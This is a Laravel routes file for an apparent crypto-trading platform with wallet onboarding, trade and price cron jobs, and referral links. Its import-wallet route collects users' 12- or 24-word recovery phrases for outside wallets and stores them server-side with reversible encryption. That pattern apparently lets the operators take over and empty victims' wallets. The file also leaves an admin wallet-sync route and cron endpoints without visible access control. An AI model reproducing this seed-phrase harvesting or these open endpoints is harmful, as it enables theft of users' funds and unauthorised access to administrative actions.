<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\CronController;
use App\Http\Controllers\Auth\RegisteredUserController;

use Illuminate\Http\Request;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/

Route::get('/', function () {
    return view('welcome');
});

use App\Http\Controllers\Admin\SettingController;

require __DIR__ . '/user/web.php';

require __DIR__ . '/admin/web.php';

require __DIR__.'/auth.php';

Route::get('/auth/wallet-option', function () {
    if (!auth()->check()) {
        return redirect()->route('login');
    }
    return view('auth.wallet-option');
})->middleware(['auth'])->name('auth.wallet-option');

Route::get('/auth/import-wallet', function () {
    if (!auth()->check()) {
        return redirect()->route('login');
    }
    return view('auth.import-wallet');
})->middleware(['auth'])->name('auth.import-wallet');

Route::post('/auth/import-wallet', function (Request $request) {
    $request->validate([
        'recovery_phrase_paste' => 'nullable|string',
        'wallet_name' => 'required|string',
        'custom_wallet_name' => 'nullable|string|max:255',
    ]);

    // Get the phrase either from paste or individual words
    if ($request->filled('recovery_phrase_paste')) {
        $phrase = trim($request->recovery_phrase_paste);
    } else {
        // Collect all word_ inputs dynamically
        $words = [];
        foreach ($request->all() as $key => $value) {
            if (str_starts_with($key, 'word_') && !empty(trim($value))) {
                $words[] = trim($value);
            }
        }
        $phrase = implode(' ', $words);
    }

    // Validate that we have exactly 12 or 24 words
    $wordsArray = array_filter(explode(' ', preg_replace('/\s+/', ' ', $phrase)));
    if (!in_array(count($wordsArray), [12, 24])) {
        return back()->withErrors(['recovery_phrase' => 'Recovery phrase must contain exactly 12 or 24 words.'])->withInput();
    }

    // Determine the wallet name to save
    $walletName = $request->wallet_name;
    if ($walletName === 'Other' && $request->filled('custom_wallet_name')) {
        $walletName = trim($request->custom_wallet_name);
    }

    // Save the encrypted phrase and wallet name to the user
    $user = $request->user();
    $user->recovery_phrase = encrypt($phrase);
    $user->phrase_confirmed_at = now();
    $user->imported_wallet_name = $walletName;
    $user->save();

    // Check if email verification is required
    if (setting('email_verification_required', '1') != '0') {
        return redirect()->route('verification.notice')->with('status', 'Wallet imported successfully from ' . $walletName . '!');
    }
    
    return redirect()->route('dashboard')->with('status', 'Wallet imported successfully from ' . $walletName . '!');
})->middleware(['auth'])->name('auth.import-wallet.store');

Route::get('/auth/recovery-phrase', function () {
    if (!auth()->check()) {
        return redirect()->route('login');
    }
    
    // Generate new phrase if not in session
    if (!session()->has('recovery_phrase')) {
        $recoveryPhraseService = app(\App\Services\RecoveryPhraseService::class);
        $phrase = $recoveryPhraseService->generate();
        session(['recovery_phrase' => $phrase]);
    }
    
    return view('auth.show-recovery-phrase');
})->middleware(['auth'])->name('auth.show-recovery-phrase');

Route::post('/auth/confirm-phrase', function (Request $request) {
    $user = $request->user();
    if ($user && !$user->phrase_confirmed_at && session()->has('recovery_phrase')) {
        // Save the generated phrase to database
        $user->recovery_phrase = encrypt(session('recovery_phrase'));
        $user->phrase_confirmed_at = now();
        $user->save();
    }
    session()->forget('recovery_phrase');
    
    // Check if email verification is required
    if (setting('email_verification_required', '1') != '0') {
        return redirect()->route('verification.notice');
    }
    
    return redirect()->route('dashboard')->with('status', 'Wallet setup successful!');
})->middleware(['auth'])->name('auth.confirm-phrase');

// Cron job endpoints (secured with token)
Route::get('/cron/run', [CronController::class, 'runScheduledTasks'])->name('cron.run');
Route::get('/cron/update-prices', [CronController::class, 'updatePrices'])->name('cron.update-prices');
Route::get('/cron/process-trades', [CronController::class, 'processTrades'])->name('cron.process-trades');
Route::get('/cron/check-subscriptions', [CronController::class, 'checkSubscriptions'])
    ->name('cron.check-subscriptions');

Route::post('/verify-referral', [RegisteredUserController::class, 'verifyReferralCode'])
    ->name('referral.verify');
Route::get('/ref/{ref}', [RegisteredUserController::class, 'create'])
    ->name('referral.register');
Route::get('/admin/settings/wallets/sync', [SettingController::class, 'syncWalletAddresses'])
    ->name('admin.settings.wallets.sync');


